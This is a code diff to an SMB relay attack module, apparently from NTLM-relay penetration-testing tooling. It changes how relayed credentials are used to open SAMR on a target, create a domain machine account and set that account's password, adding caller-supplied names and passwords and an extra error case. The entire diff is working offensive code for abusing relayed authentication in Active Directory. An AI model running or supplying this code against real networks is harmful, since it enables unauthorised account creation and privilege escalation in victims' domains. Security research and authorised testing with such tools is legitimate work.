@@ -80,9 +80,7 @@ class SMBAttack(ProtocolAttack):
                         self.__SMBConnection.getSMBServer().set_flags(flags2=flags2)
 
                     remoteOps  = RemoteOperations(self.__SMBConnection, False)
-                    # Get domain from the target, there is probably a better solution
-                    domainName = self.__SMBConnection.getRemoteHost().split('.',1)[1]
-                    remoteOps.connectSamr(domainName)
+                    remoteOps.connectSamr2(self.__SMBConnection.getRemoteHost())
                 except Exception as e:
                     if "rpc_s_access_denied" in str(e): # user doesn't have correct privileges
                         LOG.info("SAMR access denied")
@@ -93,10 +91,10 @@ class SMBAttack(ProtocolAttack):
                 try:
                     LOG.info("Target domain SID: " + remoteOps.getDomainSid())
 
-                    if (self.config.addComputerSMB == 'Rand'):
+                    if not self.config.addComputerSMB:
                         computerName = (''.join(random.choice(string.ascii_letters) for _ in range(8)) + '$').upper()
                     else:
-                        computerName = self.config.addComputerSMB if self.config.addComputerSMB.endswith('$') else self.config.addComputerSMB + '$'
+                        computerName = self.config.addComputerSMB[0]
 
                     # Code from the addComputer.py script
                     try:
@@ -106,13 +104,18 @@ class SMBAttack(ProtocolAttack):
                             raise Exception("Relayed user doesn't have right to create a machine account!")
                         elif e.error_code == 0xc00002e7:
                             raise Exception("Relayed user machine quota exceeded!")
+                        elif e.error_code == 0xc0000062:
+                            raise Exception("Account name not accepted, maybe the '$' at the end is missing ?")
                         else:
                             raise e
 
                     # Account password setup. In the NTLM relay situation it is not possible to use 'hSamrSetPasswordInternal4New()' because an error for "STATUS_WRONG_PASSWORD" is raised
                     # For the moment, I'm not sure why this error is raised even with the "USER_FORCE_PASSWORD_CHANGE" access mask during a relay. Probably an encryption issue
                     # However, with 'hSamrChangePasswordUser()' it seems to work by specifying the "old HashNT" which is the default "blank" password hash
-                    newPassword = ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(15))
+                    if (not self.config.addComputerSMB or len(self.config.addComputerSMB) < 2):
+                        newPassword = ''.join(random.choice(string.ascii_letters + string.digits + '.,;:!$-_+/*(){}#@<>^') for _ in range(15))
+                    else:
+                        newPassword = self.config.addComputerSMB[1]
                     try:
                         userHandle = createUser['UserHandle']
                         samr.hSamrChangePasswordUser(remoteOps.getSamr(), userHandle, oldPassword='', newPassword=newPassword, oldPwdHashNT="31d6cfe0d16ae931b73c59d7e0c089c0",
